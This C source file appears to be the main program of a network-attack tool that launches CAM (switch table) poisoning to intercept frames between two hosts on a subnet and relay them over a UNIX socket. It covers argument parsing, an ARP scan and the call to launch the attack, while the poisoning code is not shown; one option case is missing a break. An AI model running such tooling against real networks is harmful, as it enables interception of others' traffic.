#define MAIN_FILE

// Common configuration file (autogenerated)
#include <config.h>

// System headers
#include <stdio.h>
#include <stdlib.h>
#include <argp.h>
#include <string.h>
#include <limits.h>

// network
#include <netinet/in.h>
#include <arpa/inet.h>

// Local headers
#include <logger.h>
#include <iface.h>
#include <utils.h>
#include <arp.h>
#include <ipc.h>
#include <poison.h>


/*******************
 * Argument parser *
 *******************/
#define NB_ARGS 3
const char *argp_program_version = PACKAGE_STRING;
const char *argp_program_bug_address = PACKAGE_BUGREPORT;
static char doc[] =
"Launch a CAM poisoning attack.\n"
"It intercept frames between HOST1 and HOST2. The IPCs are handled with an "
"UNIX socket whose path is given with SOCKET. All intercepted frames are "
"send through the IPC\n\n"
"Both HOST1 and HOST2 must be valid IP address in the same subnet. If an "
"interface is defined, they also must be in the interface subnet";

#define DEFAULT_FREQ 20			// 20ms
static char args_doc[] = "HOST1 HOST2 SOCKET";
static struct argp_option options[] = {
	// Program options
	{ "interface",	'i',	"ifname",	0,	"Select the interface"},
	{ "frequency",	'f',	"freqency",	0,	"Define the duration between each "
											"poisoning phase in milliseconds. "
											"It must be between 1 and "
											STR(MAX_INT) "."
											"Default: " STR(DEFAULT_FREQ)},
	// Verbose options
	{ 0, 0, 0, 0, "Output options:" },
	{ "verbose",	'v',	0,			0,	"Produce verbose output"},
	{ "quiet",		'q',	0,			0,	"Don't produce any output"},
	{ "silence",	's',	0,			OPTION_ALIAS},
	{ "debug",		'd',	0,			0,	"Produce debug output"},
	{ 0 }
};

struct arguments {
	union {
		char *args[NB_ARGS];	// for accessing by arg number
		struct {				// for accessing by the meaning
			char *h1;
			char *h2;
			char *sock_path;
		};
	};

	char *ifname;
	int freq;

	// to store arguments once parsed
	struct in_addr h1_addr;
	struct in_addr h2_addr;
	struct iface iface;
};

/*
 * argp parser
 */
static error_t parse_opt(int key, char *arg, struct argp_state *state) {
	struct arguments *arguments = state->input;
	switch (key) {
		case 'd':
			logLevel = LOGLVL_DEBUG;
			break;
		case 'v':
			logLevel = LOGLVL_INFO;
			break;
		case 's':
		case 'q':
			logLevel = LOGLVL_CRITICAL;
			break;
		case 'i':
			arguments->ifname = arg;
			break;
		case 'f':
			arguments->freq = atoi(arg);
			if (arguments->freq < 1) {
				argp_error(state, "Invalid frenquency -- %i", arguments->freq);
			}

		case ARGP_KEY_ARG:
			if (state->arg_num >= NB_ARGS)
				// Too many arguments
				argp_usage(state);

			arguments->args[state->arg_num] = arg;
			break;

		case ARGP_KEY_END:
			// check argument number
			if (state->arg_num < NB_ARGS)
				/* Not enough arguments. */
				argp_usage(state);

			// check HOST1 & HOST2 format
			if (!inet_atoh(arguments->h1, &arguments->h1_addr))
				argp_error(state, "Invalid IP address -- %s", arguments->h1);

			if (!inet_atoh(arguments->h2, &arguments->h2_addr))
				argp_error(state, "Invalid IP address -- %s", arguments->h2);

			// parse the interface
			if (arguments->ifname == NULL) {
				if (!get_iface_by_ip(arguments->h1_addr, &arguments->iface)) {
					argp_error(state, "Interface not found for IP -- %s",
							arguments->h1);
				}
			} else {
				if (!get_iface_by_name(arguments->ifname, &arguments->iface)) {
					argp_error(state,"Interface not found -- %s",
							arguments->ifname);
				}
			}

			// check both hosts are in the same subnet
			if (!(IN_INTERFACE(arguments->h1_addr, arguments->iface) &&
						IN_INTERFACE(arguments->h2_addr, arguments->iface))) {
				argp_error(state,"Hosts are not in the same subnet or "
						"are not in the interface subnet");
			}
			break;

		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
}

static struct argp argp = { options, parse_opt, args_doc, doc, 0, 0, 0 };


/********
 * Main *
 ********/
int main(int argc, char *argv[]) {
	init_logger();

	// parse the commandline arguments
	struct arguments args;
	memset(&args, 0, sizeof(struct arguments));
	// default arguments' values
	args.freq = DEFAULT_FREQ;

	// parse cmdline arguments
	argp_parse(&argp, argc, argv, 0, 0, &args);

	// launch the ARP scan
	arp_cache_init();
	arp_scan(&args.iface);

	// ensure HOST1 and HOST2 are in the local cache
	if (!arp_ensure(&args.iface, args.h1_addr)) {
		log_critical("Could find host %s in the network\n",
				inet_htoa(args.h1_addr));
		exit(1);
	}
	if (!arp_ensure(&args.iface, args.h2_addr)) {
		log_critical("Could find host %s in the network\n",
				inet_htoa(args.h2_addr));
		exit(1);
	}

	// open the IPC socket
	struct ipc ipc;
	open_ipc(&ipc, args.sock_path);

	// launch the attack
	launch_attack(&args.iface, &ipc, args.freq, args.h1_addr,args.h2_addr);

	// close the IPC socket

	// free the cache
	arp_cache_free();
	return 0;
}
